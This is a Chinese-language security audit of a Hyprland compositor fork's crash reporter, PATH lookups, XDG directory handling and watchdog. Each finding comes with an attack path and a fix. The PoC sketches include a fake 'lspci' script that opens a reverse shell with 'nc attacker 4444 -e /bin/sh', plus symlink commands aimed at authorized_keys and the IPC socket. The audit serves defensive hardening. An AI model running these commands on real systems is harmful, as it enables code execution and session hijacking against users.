# 审计域 12 — 启动链与系统接口（Boot Chain & System Interfaces）

- 仓库：/home/wilf/data/Hyprland（Hyprland v0.56.0 fork，main @ 397cb0efb）
- 审计范围：`start/`、`systemd/`、`src/helpers/SdDaemon*`、`src/debug/crash/*`、`src/helpers/MiscFunctions*`、`src/helpers/fs/FsUtils*`、`src/config/supplementary/executor/Executor.cpp`、`src/debug/Overlay.*`，以及 `src/Compositor.cpp` / `src/main.cpp` 中的启动路径
- 威胁模型：同机其他用户、被污染的环境变量（PATH / XDG_* / NOTIFY_SOCKET / HYPRLAND_NO_* 等）、非特权进程可读 crash 报告或覆盖文件
- 备注：经 `git diff origin/main..HEAD` 核对，本审计域的文件与上游 v0.56 基本一致（fork 的 64 个本地提交集中在 CM/HDR），因此下列发现大多为上游性弱点在本 fork 中的实际存在，而非 fork 引入的回归。
- 注：本 fork 的 `start-hyprland` 已是 C++ watchdog（`start/src/`），不存在旧版 shell 脚本；未发现 `eval`/未引号变量展开类 shell 缺陷，相应风险转移为下述 PATH/execvp 问题（F-BOOT-03）。`MiscFunctions` 中旧版 `execAndDestroy`/`spawnProcessWithRules`/PID 文件已重构至 `config/supplementary/executor/Executor.cpp` 与 `Compositor.cpp` 的 lock 文件逻辑。

## 严重度总览

| ID | 严重度 | 摘要 |
|----|--------|------|
| F-BOOT-01 | 高 | crash 报告文件可预测路径 + 无 O_EXCL/O_NOFOLLOW/O_TRUNC → 符号链接覆盖/内容重定向 |
| F-BOOT-02 | 高 | 信号处理程序中 fork+`/bin/sh -c`，lspci/addr2line 等按继承 PATH 解析 → 环境污染即得崩溃时代码执行 |
| F-BOOT-03 | 中高 | 所有 PATH 可执行查找只查 others_exec 位，不校验属主/目录权限；空 PATH 条目回退到 cwd |
| F-BOOT-04 | 中 | XDG_RUNTIME_DIR 仅"警告"不校验属主 → socket/日志/lock 落进攻击者目录 |
| F-BOOT-05 | 中低 | `Env::envEnabled` 任意非空值即生效，一个注入变量可关掉 crash 报告器/systemd 通知 |
| F-BOOT-06 | 低 | NOTIFY_SOCKET 未验证，READY=1 可被劫持；缺 `fd` 前缀支持 |
| F-BOOT-07 | 低 | FsUtils 数据目录 TOCTOU + writeToFile 无 O_NOFOLLOW/O_EXCL |
| F-BOOT-08 | 低 | watchdog：fork 子进程内再次 fork/exec、无重启退避、strdup 泄漏 |
| F-BOOT-09 | 低 | 不限制 coredump：abort() 产生 core，进程内存含实例签名/密钥 |
| F-BOOT-10 | 信息 | absolutePath 空串/无 HOME UB；Overlay 审计干净（仅小内存增长） |

---

## F-BOOT-01（高）Crash 报告：可预测文件名 + open() 缺 O_EXCL/O_NOFOLLOW/O_TRUNC

**位置**
- `src/debug/crash/CrashReporter.cpp:60-98`（路径构造与 `open`）
  - 60-74：路径 = `$XDG_CACHE_HOME/hyprland/` 或 `$HOME/.cache/hyprland/`，两变量完全来自环境，无属主/权限校验
  - 76：`mkdir(reportPath, S_IRWXU)`，`EEXIST` 被接受（不校验已存在目录的属主与权限）
  - 80-82：文件名 `hyprlandCrashReport<pid>.txt`，pid 可预测（PID 空间有限，重启复用）
  - 96：`open(reportPath, O_WRONLY | O_CREAT, S_IRUSR | S_IWUSR)` — **没有 `O_EXCL`、没有 `O_NOFOLLOW`、没有 `O_TRUNC`**

**攻击路径**
1. 环境注入（威胁模型内）：攻击者设法让 Hyprland 以 `XDG_CACHE_HOME=/tmp/shared`（攻击者可写目录，如经污染的 .pam_environment、DM 会话文件、systemd user unit、`.desktop` 会话脚本）启动。
2. 攻击者预先在 `/tmp/shared/hyprland/` 放置符号链接 `hyprlandCrashReport<PID>.txt -> /home/victim/.config/autostart/x.desktop`（或 `~/.config/hypr/hyprland.conf` 追加素材、`~/.xsessionrc` 等）。
3. Hyprland 崩溃（可由恶意 Wayland 客户端/触发器诱发，或用 `kill -SEGV` 的本地 DoS-adjacent 场景）→ 信号处理器按 PID 名 open 跟随符号链接，把报告内容写进攻击者选定目标。
4. 报告内容部分受攻击者影响：插件名/作者/版本（`CrashReporter.cpp:125-144`，来自第三方 .so）、`uname` 节点名（可控）、`os-release` 输出、日志尾部（含窗口标题等）→ 可构造向目标文件注入有意义的内容。
5. 无 `O_TRUNC`：旧文件残留尾部拼接在新内容后（内容混淆/利用面扩大）。
6. 反向泄露：即使不改目标，把 `XDG_CACHE_HOME` 指到攻击者目录时报告（0600 但属主为 victim，位于攻击者文件系统 + 攻击者可先建同名硬链接目录结构？0600 无法直读，但符号链接重定向可让其直接落在攻击者可读位置）→ 非特权进程可读 crash 报告（含完整日志尾部、路径、GPU/系统指纹）。

**PoC 思路（文字）**
- 同机攻击者监控受害者会话：`inotifywait` 或轮询猜测 Hyprland 即将使用的 PID（fork 场景下 start-hyprland 重启循环会快速复用 PID 区间）。
- 在共享可写的 `XDG_CACHE_HOME/hyprland/` 中预放 `ln -s ~/.ssh/authorized_keys hyprlandCrashReport<PID>.txt`；等待崩溃 → 报告文本（首行受 `getRandomMessage` 影响，后续含可控插件元数据）被写入 authorized_keys（虽然内容非合法 key，但证明任意文件写原语成立；换成 autostart .desktop / xprofile 类解释器文件即可获代码执行）。

**修复**
- `open(path, O_WRONLY|O_CREAT|O_EXCL|O_NOFOLLOW|O_TRUNC, S_IRUSR|S_IWUSR)`；`EEXIST` 时改用 `hyprlandCrashReport<pid>-<随机后缀>.txt`（信号处理器里可用 `getrandom(2)`，异步信号安全）。
- 目录用 `mkdirat` 链逐段创建并对每级 `O_NOFOLLOW`；对已存在目录 `fstat` 校验 `st_uid == getuid()` 且 `mode & 0077 == 0`，否则拒绝写入并退回安全路径（如 `$XDG_RUNTIME_DIR`）。
- 写完 `fstat` fd 校验 `nlink == 1` 防硬链接。

---

## F-BOOT-02（高）信号处理程序中经 shell 执行外部命令，按继承 PATH 解析 → 环境污染 = 崩溃时任意代码执行

**位置**
- `src/debug/crash/SignalSafe.hpp:123-181`（`writeCmdOutput`：`fork()` + `execv("/bin/sh", {"/bin/sh","-c",cmd,...})`）
- `src/debug/crash/CrashReporter.cpp:165-171`：崩溃时执行 `lspci -vnn | grep -E ...`、`cat /etc/os-release | sed ...` — `lspci/grep/cat/sed` 全部经 sh 的 PATH 查找
- `src/helpers/MiscFunctions.cpp:158-165`（`execAndGet` → `CProcess("/bin/sh", {"-c", cmd})`）与 `CrashReporter.cpp:232`：`addr2line -e {FPATH} -Cf {addrs}`，**FPATH（`/proc/self/exe` canonical 路径）未经引号包裹拼进 shell 命令串**
- 触发入口：`src/Compositor.cpp:105-121, 294-299`（`handleUnrecoverableSignal` 注册 SIGSEGV/SIGABRT）

**攻击路径**
1. 攻击者污染 Hyprland 启动环境（同 F-BOOT-01 的注入面：DM 会话文件、systemd unit、`environment.d/`）把 `PATH=/tmp/evil:...` 注入。
2. 任意原因触发崩溃（恶意客户端、渲染器 bug，或本地进程 `kill -SEGV <已知pid>`——Hyprland PID 可通过 `/proc` 按 `HYPRLAND_CMD` 枚举）→ 信号处理器 fork 出 `/bin/sh`，从 PATH 执行攻击者放置的假 `lspci`/`grep`/`addr2line` → **以受害者身份、带完整会话环境（WAYLAND_DISPLAY、实例签名）执行任意代码**。
3. 次级注入：若 PATH 干净但 Hyprland 二进制从含 shell 元字符的路径运行（`--path` 或安装位置可控，fork 场景常见，如从用户可写目录运行），`addr2line -e /path/with$(evil)/...` 未加引号 → 命令替换执行。
4. 附加稳健性问题：在信号处理器里 `fork`+`execv` 及 `CrashReporter` 中 `std::string/std::format/backtrace_symbols/std::filesystem::canonical`（`CrashReporter.cpp:177-232`，注释自认非 async-signal-safe）都可能因其它线程持锁而死锁，仅靠 `alarm(15)`（`Compositor.cpp:112-116`）兜底；`signal()` 未用 `sigaction+SA_ONSTACK`，栈溢出类崩溃处理器本身可能跑不起来。

**PoC 思路（文字）**
- `mkdir -p /tmp/evil && printf '#!/bin/sh\nnc attacker 4444 -e /bin/sh\n' > /tmp/evil/lspci && chmod 755 /tmp/evil/lspci`
- 以 `PATH=/tmp/evil:$PATH Hyprland` 启动（前提：能注入环境）；`kill -SEGV $(pgrep -x Hyprland)` → 反弹 shell。

**修复**
- 崩溃路径不要调用 shell：固定绝对路径 `execv("/usr/bin/lspci", ...)` 或干脆把 GPU/os-release 采集交给正常上下文（启动时预采集、崩溃时仅写缓存）；addr2line 同理用 `execve` + 静态解析库（如 `libbacktrace` 的异步信号安全变体）。
- 若必须拼命令，FPATH 需按单引号转义；校验 `PATH` 条目属主（见 F-BOOT-03）。
- 用 `sigaction` + `sigaltstack` 注册，避免 `signal()`。

---

## F-BOOT-03（中高）PATH 可执行查找不校验信任属性；空 PATH 条目落到 cwd

**位置**
- `start/src/helpers/Nix.cpp:48-70`（`executableExistsInPath`：仅查 `others_exec`）与 `Nix.cpp:92`（`CProcess("Hyprland", {"--version-json"})`）、`Nix.cpp:66`（`execvp("nixGL", ...)`）、`Nix.cpp:68`（`execvp(customPath...)`，非绝对路径时同样走 PATH）
- `src/helpers/fs/FsUtils.cpp:83-107`（同名函数，另有逻辑 bug：第一个命中的候选文件若无 others_exec 直接 `return false`，不再继续扫描）
- 调用方（全部自动触发，无需用户操作）：
  - `src/managers/VersionKeeperManager.cpp:51-60` → `CProcess("hyprland-update-screen", ...)`
  - `src/managers/WelcomeManager.cpp:25-32` → `CProcess("hyprland-welcome", ...)`
  - `src/managers/DonationNagManager.cpp:126-134` → `CProcess("hyprland-donate-screen", ...)`
  - `src/helpers/AsyncDialogBox.cpp:103` → `CProcess("hyprland-dialog", ...)`（safe-mode 对话框，崩溃循环时弹出）
  - `src/Compositor.cpp:960-971` → `CProcess("xdg-open", {reportPath})`（reportPath 也来自环境注入的 XDG_CACHE_HOME）

**攻击路径**
1. 攻击者（同机用户或可写 env 的进程）向任一 PATH 目录（`~/.local/bin`、`/tmp`、任何 group-writable PATH 目录，或由被污染 PATH 引入的目录）放置可执行 `hyprland-welcome`/`hyprland-update-screen`/`nixGL`/`Hyprland`。
2. 只需 others_exec 位即通过检查；`CVarList2(PATH,...,':',true)` 的空条目（`PATH="a::b"` 或首尾冒号）生成相对路径 = **当前目录**，`execvp` 对空条目同样回退 cwd 搜索。
3. 结果：开机/欢迎屏/更新通知/对话框这些"可信"程序实为攻击者二进制，且继承 compositor 环境（`WAYLAND_DISPLAY`、`HYPRLAND_INSTANCE_SIGNATURE`，见 `Executor.cpp:191-196`）→ 攻击者进程成为 compositor 的完全可信客户端（键盘记录、`hyprctl dispatch exec` 级别的会话接管）。
4. nix 检测链尤其糟：`--version-json` 查询也走 PATH（假 `Hyprland` 返回 `flags:["nix"]` 即可强制走 nixGL execvp 分支）。

**PoC 思路（文字）**
- 向受害者 PATH 中可写目录放 `hyprland-welcome`（脚本内容：连回攻击机并 `hyprctl devices` 取证）；触发条件：`misc:autogenerated=1` 时下次启动自动执行（`WelcomeManager.cpp:12-20`）。

**修复**
- 统一实现一个"可信 PATH 查找"：对候选文件及其**每一级父目录** `stat`，要求属主为 root 或本 uid、且无 group/world 写位；拒绝空 PATH 条目与相对 PATH 条目；用解析出的绝对路径 `execv` 而非 `execvp`。
- `--version-json` 用已解析出的 Hyprland 绝对路径（例如 `/proc/self/exe` 同目录约定）而非 PATH 名。

---

## F-BOOT-04（中）XDG_RUNTIME_DIR 弱校验：实例目录/socket/日志可落入攻击者控制的目录

**位置**
- `src/Compositor.cpp:196-236`：`m_hyprTempDataRoot = "$XDG_RUNTIME_DIR/hypr"`；仅当结果以 `/hypr` 开头才拒绝（196-205），非 `/run/user` 前缀**只打警告继续跑**（206-207）；`exists()` 后 `mkdir`（216-218）存在 TOCTOU；`mkdir(m_instancePath, S_IRWXU)`（228）
- `src/main.cpp:202-205`：只检查非空
- 受影响产物：实例目录下 `hyprland.lock`（`Compositor.cpp:775-783`，含 PID + socket 名）、日志（`Log::logger->initIS`）、IPC socket（`.socket.sock`/`.socket2.sock`）

**攻击路径**
1. 环境污染：`XDG_RUNTIME_DIR=/tmp/r`（攻击者预建并拥有）。Hyprland 只警告继续。
2. 攻击者拥有父目录 → 可 readdir 枚举随机实例签名目录名、inotify 监控创建事件；可 rename/unlink 实例目录（抢占 socket：先删受害者 `.socket.sock` 再以同名软链接监听）→ 冒充 compositor IPC 服务，受害者后续启动的所有客户端/hyprctl 连接攻击者，`dispatch exec` 类请求（含 `HL_*` token、环境变量）泄露 → 会话接管。
3. `hyprland.lock` 内容（PID、socket 名）进入攻击者可见文件系统，辅助 F-BOOT-01 的 PID 猜测。

**PoC 思路（文字）**
- 注入 `XDG_RUNTIME_DIR=/tmp/r`；`mkdir /tmp/r/hypr && chown attacker`；`inotifywait -m /tmp/r/hypr` 拿到实例签名 → 待 compositor 建 socket 后 `rm -f $IS/.socket.sock && ln -s /tmp/evil.sock $IS/.socket.sock`，等待客户端重连/新客户端连接。

**修复**
- 硬性要求：`realpath(XDG_RUNTIME_DIR) == /run/user/<getuid()>` 且 `stat` 属主为当前 uid、mode 为 0700（拒绝符号链接），否则 fatal（`--i-am-really-stupid` 类逃生阀）。
- `mkdir` 竞争：直接 `mkdir` 并区分 `EEXIST`/`ENOTDIR`，不先 `exists()`。

---

## F-BOOT-05（中低）Env::envEnabled 语义过宽：单个注入变量可关闭 crash 报告器与 systemd 通知

**位置**
- `src/helpers/env/Env.cpp:5-7`：`getenv(env)` 非空且不是恰好 `"0"` 即为真
- 消费者：`src/Compositor.cpp:294`（`HYPRLAND_NO_CRASHREPORTER`）、`Compositor.cpp:582,824`（`HYPRLAND_NO_SD_NOTIFY`）、`Compositor.cpp:810`（`HYPRLAND_NO_SD_TARGET`）、`Compositor.cpp:~797`（`HYPRLAND_NO_SD_VARS`）

**攻击路径**
- 攻击者获得"只能设置一个环境变量"的弱注入（例如某个被共享的 profile.d 片段、DM 的 locale 注入），设置 `HYPRLAND_NO_CRASHREPORTER=nope-any-nonzero` → 崩溃取证全部消失（进程直接 abort），配合 F-BOOT-09 让现场仅剩系统 core；`HYPRLAND_NO_SD_NOTIFY=1` 破坏 systemd 依赖时序（挂起依赖 READY=1 的 unit，DoS 会话服务）。
- 文档惯例是把这类开关当"存在即开"，但审计角度应拒绝布尔之外的值语义并记录 WARN。

**修复**：对 `HYPRLAND_NO_*` 采用严格解析（`1/true/yes/on` 才生效，见 `MiscFunctions.cpp:465-479` 已有的 `truthy()`），并在生效时向日志写 WARNING 以便事后审计。

---

## F-BOOT-06（低）SdDaemon：NOTIFY_SOCKET 未验证即 connect；缺 `fd` 支持

**位置**
- `src/helpers/SdDaemon.cpp:23-58`：`getenv("NOTIFY_SOCKET")`（37）后直接 `strncpy` 进 `sockaddr_un` 并 `connect`；接受 `'@'` 抽象命名空间（47-48）；`strnlen(addr, sizeof(sun_path)-1)` 超长静默截断（43）；`strnlen(state,128)` 截断消息（54）
- 调用方：`src/Compositor.cpp:582-583`（STOPPING=1）、`Compositor.cpp:822-825`（READY=1）

**攻击路径/影响**
- 环境注入 `NOTIFY_SOCKET=@x` 或 `/tmp/attacker.sock`：READY=1/STOPPING=1（含可预测固定文本）发给攻击者 socket → 泄露"会话就绪/退出"时序，辅助计时类攻击；无鉴权。
- 功能性：不支持 `NOTIFY_SOCKET=fd:...`，与真 `sd_notify(3)` 行为不一致（fork 内自实现，静默失败）。

**修复**：优先链接 libsystemd 的 `sd_notify`；自实现则：拒绝不以 `/` 或 `@/run/systemd` 特征之外的值，或校验目标 socket 属主（`SO_PEERCRED`/stat 文件属主为 root/systemd），并在截断时返回错误而非静默。

---

## F-BOOT-07（低）FsUtils 数据目录 TOCTOU；writeToFile 无符号链接防护

**位置**
- `src/helpers/fs/FsUtils.cpp:12-55`：`exists()` → `create_directory()` → 之后才 `permissions()`（37-46），创建与 chmod 之间有竞争窗口；`XDG_DATA_HOME` 未做任何属主/权限校验
- `FsUtils.cpp:70-81`：`writeToFile` 用 `std::ofstream(path, trunc)`，跟随符号链接、无 O_EXCL/O_NOFOLLOW
- 消费方：`VersionKeeperManager.cpp:28-46`（`lastVersion`）、`DonationNagManager.cpp`（nag 状态文件；另注意 `:135` `*DATAROOT` 在未 check 情况下解引用，`getDataHome` 返回 nullopt 时直接崩 → 自 DoS）

**攻击路径**
- 注入 `XDG_DATA_HOME=/tmp/d`（攻击者拥有）→ Hyprland 把 `lastVersion`、donation 状态写进攻击者目录；攻击者预放符号链接 → **任意（可写路径的）文件覆盖**，内容虽是短版本串/nag 状态（可控性低），但足以破坏文件（如截断受害者 autostart 项）或在共享目录伪装数据源。
- 首次创建 `hyprland/` 子目录与 chmod 之间的竞态：同机用户若恰好能写 `XDG_DATA_HOME` 根，可抢先建 `hyprland/lastVersion` 符号链接。

**修复**：`getDataHome` 校验 `st_uid==getuid() && !(mode&0077)`；`writeToFile` 改 `open(O_WRONLY|O_CREAT|O_TRUNC|O_NOFOLLOW, 0600)` + `fstat` nlink 检查；DonationNag 对 `DATAROOT` 做 `has_value()` 检查。

---

## F-BOOT-08（低）start-hyprland watchdog 的健壮性/环境问题

**位置**
- `start/src/core/Instance.cpp:47-74`：
  - `execvp("nixGL"/customPath)` 依赖 PATH（详见 F-BOOT-03）；`--path` 允许任意相对命令名
  - **fork 之后、exec 之前再次调用 `Nix::shouldUseNixGL()`**（Instance.cpp:63 → Nix.cpp:84-96）：在多线程 fork 子进程里 `CProcess::runSync()`（又 fork 一次 + waitpid + 日志）——非 async-signal-safe，可能死锁/未定义行为
  - `strdup` 的 args 从不释放（每代子进程泄漏一小组，watchdog 长期重启循环下可忽略但应改 `std::vector<std::string>`+`data()` 缓存）
- `start/src/main.cpp:107-121`：崩溃-重启循环无退避（backoff）、无次数上限；`safeMode` 后仍无限重启（本地 DoS：可稳定触发崩溃者使 CPU 满载 + 日志膨胀；且 `dispatchHyprlandEvent` 无条件信任子进程文本协议 `lock/unlock/vax/end`，恶意 Hyprland 二进制可伪造 `lock` 使下次重启带 `--locked`）

**修复**：把 nixGL 判定移到 fork 前（结果缓存）；exec 列表用持有所有权的容器；重启循环加指数退避与 N 次熔断；`--path` 若给出则要求绝对路径或经 F-BOOT-03 的可信解析。

---

## F-BOOT-09（低）不设 RLIMIT_CORE / PR_SET_DUMPABLE：崩溃内存随系统 coredump 策略外泄

**位置**（缺失代码本身即发现）
- 全树 grep 无 `RLIMIT_CORE`、`prctl(PR_SET_DUMPABLE`、`coredump` 处理；`src/Compositor.cpp:105-121` 崩溃后直接 `abort()`，`start/` watchdog 也不设置

**攻击路径**
- Hyprland 进程内存含：`HYPRLAND_INSTANCE_SIGNATURE`、`WAYLAND_DISPLAY`、exec-rule token（`Executor.cpp:131`）、剪贴板/输入法缓冲、shm 映射。默认 systemd-coredump 下，`coredumpctl` 对同 uid 可读尚可，但：
  - 若管理员把 `kernel.core_pattern` 配成写入世界可读目录（旧式 `core.%p` + `/var/crash` 宽松权限）→ 同机非特权用户可读完整内存镜像（含实例签名 → 可冒充 IPC 客户端）。
  - crash 报告器与 watchdog 均不关闭 core，也不校验。

**修复**：启动时（`src/main.cpp`）`setrlimit(RLIMIT_CORE, {0,0})` 或 `prctl(PR_SET_DUMPABLE, 0)`（二者都影响 ptrace 取证，建议文档化开关 `HYPRLAND_ALLOW_COREDUMP`）；在发行版打包说明中要求 core 走 systemd-coredump 且 0600。

---

## F-BOOT-10（信息）杂项

- `src/helpers/MiscFunctions.cpp:54-76` `absolutePath`：
  - `value[0]`（57）未判空 → 空字符串 UB；`getenv("HOME")` 为 null 时 `std::string(ENVHOME)`（58-59）构造自 nullptr → UB 崩溃（配置里 `~` 展开在无 HOME 环境直接崩 compositor，配合 F-BOOT-05 属"环境污染→DoS"链）。
  - `execAndGet`（158-165）见 F-BOOT-02。
- `src/Compositor.cpp:775-783` lock 文件：`std::ofstream` 无 O_NOFOLLOW；因实例目录 0700 且随机名，正常配置下可接受，风险在 XDG_RUNTIME_DIR 被劫持时放大（归入 F-BOOT-04）。
- `src/debug/Overlay.cpp`：审计**未发现安全问题**。纯渲染逻辑、无外部输入解析路径；`m_monitorOverlays`（`Overlay.hpp`，按 `PHLMONITOR` 键）在 monitor 拔出后未见清理，长期热插拔下小内存增长（低优先级健壮性问题）。
- `systemd/hyprland-session.target`、`systemd/hyprland-uwsm.desktop`：内容平凡，无可执行注入面；注意 `.desktop` 安装路径若 group-writable 会被 F-BOOT-03 类问题波及（属打包问题）。
- `Executor.cpp:32-37`：启动时 `spawnRaw("systemctl --user import-environment ... PATH XDG_DATA_DIRS && dbus-update-activation-environment ... PATH ...")` 把**被污染的 PATH/XDG_DATA_DIRS 主动推送进 dbus activation 环境** → 用户 systemd user 服务与 D-Bus activatable 服务全部继承污染 → 横向扩大。属设计如此，但建议在推送前过滤可疑条目（含 world-writable 目录的 PATH 组件），并在文档中警告。

## 优先级建议（修复顺序）

1. F-BOOT-01/02（崩溃报告器）：一次 PR 可解决——O_EXCL+O_NOFOLLOW+随机后缀，去掉信号处理器内 shell 调用（预采集 GPU/os-release，addr2line 移出信号路径）。
2. F-BOOT-03：抽出统一的可信 PATH 查找工具，替换 `FsUtils::executableExistsInPath`（顺带修 `return` 逻辑 bug）与 `Nix.cpp` 版本。
3. F-BOOT-04/07：XDG 目录属主/权限硬校验。
4. 其余按低优先级排入硬化 backlog。
